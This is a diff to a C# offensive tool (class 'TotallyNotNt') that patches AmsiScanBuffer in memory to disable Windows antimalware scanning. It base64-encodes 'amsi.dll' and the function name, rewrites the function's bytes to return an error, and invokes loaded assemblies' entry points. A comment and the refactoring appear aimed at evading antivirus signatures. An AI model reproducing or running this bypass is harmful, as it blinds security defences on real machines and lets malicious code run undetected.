@@ -140,10 +140,16 @@ public class TotallyNotNt
 		
     }
 	
-	public static void testMe(Assembly fooBarFinally, string args){
-		var barFoo = new object[] { new string[] { args } };
-		
-		fooBarFinally.EntryPoint.Invoke(0, barFoo);
+	public static void testMe(Assembly asm, string args){
+			//Ripped from https://stackoverflow.com/questions/28616405/trouble-with-assembly-entrypoint-invoke-c
+			//Will this cause signatures to be made elsewhere ? 
+		// Get your point of entry.
+		MethodInfo entryPoint = asm.EntryPoint;
+
+		// Invoke point of entry with arguments.
+		entryPoint.Invoke(null, new object[] { new string[] {  args } } );
+
+
 	}
 	
     public static List<string> GetBins()
@@ -161,35 +167,44 @@ public class TotallyNotNt
         return avBinaries;
 
     }
+	
+	public static void CopyData(byte[] dataStuff, IntPtr intAddr){
+		
+		 Marshal.Copy(dataStuff, 0, intAddr, dataStuff.Length);
+	}
+	
     private static void MoveLifeAhead(bool BigBoy = false)
     {
         try
         {
 				var fooBar = WinLibBase.LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw=")));
                 IntPtr addr = WinLibBase.GetProcAddress(fooBar, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));
+				uint magicRastaValue = 0x40;
 				
+				 uint someNumber = 0;
+				 
             if (BigBoy)
             {
-                Console.WriteLine("[+] Patching...");
-
-                uint someNumber = 0;
+				var bigBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
 				
-                WinLibBase.VirtualProtect(addr, (UIntPtr)new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }.Length, 0x40, out someNumber);
-
-                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, addr, new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }.Length);
-
+                Console.WriteLine("[+] Patching...");
+		
+                WinLibBase.VirtualProtect(addr, (UIntPtr)bigBoyBytes.Length, magicRastaValue , out someNumber);
+				
+                CopyData(bigBoyBytes,addr);
+				
                 Console.WriteLine("[+] Patched!");
             }
             else
             {
+				var smallBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+				
                 Console.WriteLine("[+] Patching ...");
-
-                uint someNumber = 0;
               
-                WinLibBase.VirtualProtect(addr, (UIntPtr)new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }.Length, 0x40, out someNumber);
-
-                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }, 0, addr, new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }.Length);
-
+                WinLibBase.VirtualProtect(addr, (UIntPtr)smallBoyBytes.Length, magicRastaValue, out someNumber);
+				
+                CopyData(smallBoyBytes, addr);
+				
                 Console.WriteLine("[+] Patched!");
 
             }
@@ -208,6 +223,7 @@ public class TotallyNotNt
 
 public class WinLibBase
 {
+
     [DllImport("kernel32")]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
